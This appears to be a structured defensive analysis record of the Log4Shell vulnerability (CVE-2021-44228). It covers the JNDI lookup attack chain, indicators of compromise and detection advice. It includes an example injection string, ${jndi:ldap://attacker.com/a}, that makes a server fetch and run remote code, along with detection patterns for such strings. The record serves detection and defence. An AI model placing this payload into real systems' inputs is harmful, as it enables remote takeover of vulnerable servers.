package_info.why_malicious: The affected Log4j package versions contain a critical remote code execution vulnerability (CVE-2021-44228, 'Log4Shell'), which allows attackers to execute arbitrary code on systems using vulnerable versions. This is due to unsafe handling of JNDI lookups in log message content, enabling exploitation by remote attackers. While not intentionally malicious, the vulnerability enables severe exploitation for malicious purposes.

execution_context.trigger: runtime (when a log message is processed)

malicious_snippets.code_behavior: At runtime, the code processes a log message containing a JNDI lookup pattern, which causes Log4j to perform a remote LDAP request to attacker.com, retrieves a malicious Java class, and loads it for execution, resulting in arbitrary code execution.

malice_analysis.why_suspicious: This behavior allows untrusted user input in log messages to trigger remote JNDI lookups, enabling attackers to force the application to connect to arbitrary servers and execute attacker-supplied code.
malice_analysis.violated_expectations: Normal logging frameworks should treat log message content as inert data and must not allow it to trigger network requests or dynamic code execution. Log message processing should never result in remote class loading.
malice_analysis.similar_legitimate_use: JNDI lookups are legitimately used for resource resolution in enterprise Java applications, but only when explicitly configured and never from untrusted or user-controlled log message content.
key_indicators: Presence of ${jndi:...} patterns in log messages
Outbound LDAP or RMI network requests initiated during log processing
Dynamic loading and execution of Java classes from remote sources
Use of JndiLookup in log4j-core prior to version 2.15.0

attack_chain.action: Attacker sends a crafted log message containing a JNDI lookup string (e.g., ${jndi:ldap://attacker.com/a}) to a vulnerable application.
attack_chain.leads_to: The vulnerable Log4j instance processes the message and initiates a remote JNDI lookup.

attack_chain.action: Log4j performs a JNDI lookup to the attacker-controlled LDAP server specified in the log message.
attack_chain.leads_to: The attacker-controlled server responds with a malicious Java class file.

attack_chain.action: The malicious Java class is loaded and executed on the victim system by the Log4j process.
attack_chain.leads_to: Attacker gains remote code execution and control over the system.

behavioral_signatures: Log message content containing ${jndi:ldap://...}, ${jndi:rmi://...}, or similar patterns
Unexpected outbound LDAP or RMI network requests from Java application processes during log processing
Dynamic class loading from remote sources triggered by log message content
file_indicators: Presence of vulnerable log4j-core JAR files (log4j-core-*.jar with version < 2.15.0)
Application logs containing suspicious JNDI patterns such as ${jndi:ldap:// or ${jndi:rmi://
network_indicators: Outbound LDAP or RMI requests to external or untrusted IP addresses/domains from application servers
Connections to attacker-controlled infrastructure (as specified in JNDI patterns) during log processing
detection_knowledge.how_to_detect: Monitor application logs for JNDI lookup patterns (e.g., ${jndi:ldap://, ${jndi:rmi://), scan deployed Java applications for vulnerable log4j-core versions (<2.15.0), and alert on unexpected outbound LDAP/RMI connections from application servers. Use software composition analysis tools to identify and block vulnerable dependencies. Implement network monitoring to detect and block suspicious LDAP/RMI traffic originating from application hosts.
